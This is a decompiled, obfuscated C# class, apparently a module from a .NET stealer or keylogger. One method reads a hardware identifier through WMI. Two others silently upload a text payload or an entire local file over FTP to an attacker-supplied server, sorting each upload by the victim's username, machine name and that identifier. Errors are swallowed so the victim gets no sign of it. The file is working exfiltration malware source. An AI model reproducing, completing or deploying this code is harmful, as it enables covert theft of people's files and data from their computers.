using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace InTDhhOfzy;

internal sealed class vYNZTwVhFOANy
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string kIGHOBEUhMtWMkFKG()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107409204));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107409215)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107409198);
			ManagementObject val3 = new ManagementObject(getString_0(107409193) + text + getString_0(107409152));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107409115)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107395193);
		}
	}

	public static void hHyGBxLiABAHfN(string yucTJuqexDu = "URL", string KJoMiGOdFosgGZV = "USERNAME", string DbHxoaDSjeefqu = "ACCESO", string bDMXNKirLn = "")
	{
		try
		{
			string text = kIGHOBEUhMtWMkFKG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(yucTJuqexDu + getString_0(107410405) + Environment.UserName + getString_0(107410360) + Environment.MachineName + getString_0(107410371) + text + getString_0(107410334));
			ftpWebRequest.Method = getString_0(107409122);
			ftpWebRequest.Credentials = new NetworkCredential(KJoMiGOdFosgGZV, DbHxoaDSjeefqu);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(bDMXNKirLn);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void EZWAhnqPwpiA(string XaiOwcAgsvy = "URL", string zJgdqTHEGiHYhIA = "USERNAME", string WPXvZSpJPQRiym = "ACCESO", string RmJZPLvaZdbd = "")
	{
		try
		{
			string text = kIGHOBEUhMtWMkFKG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(XaiOwcAgsvy + getString_0(107410405) + Environment.UserName + getString_0(107410360) + Environment.MachineName + getString_0(107410371) + text + getString_0(107410371) + Path.GetFileName(RmJZPLvaZdbd));
			ftpWebRequest.Method = getString_0(107409122);
			ftpWebRequest.Credentials = new NetworkCredential(zJgdqTHEGiHYhIA, WPXvZSpJPQRiym);
			byte[] array = File.ReadAllBytes(RmJZPLvaZdbd);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static vYNZTwVhFOANy()
	{
		Strings.CreateGetStringDelegate(typeof(vYNZTwVhFOANy));
	}
}
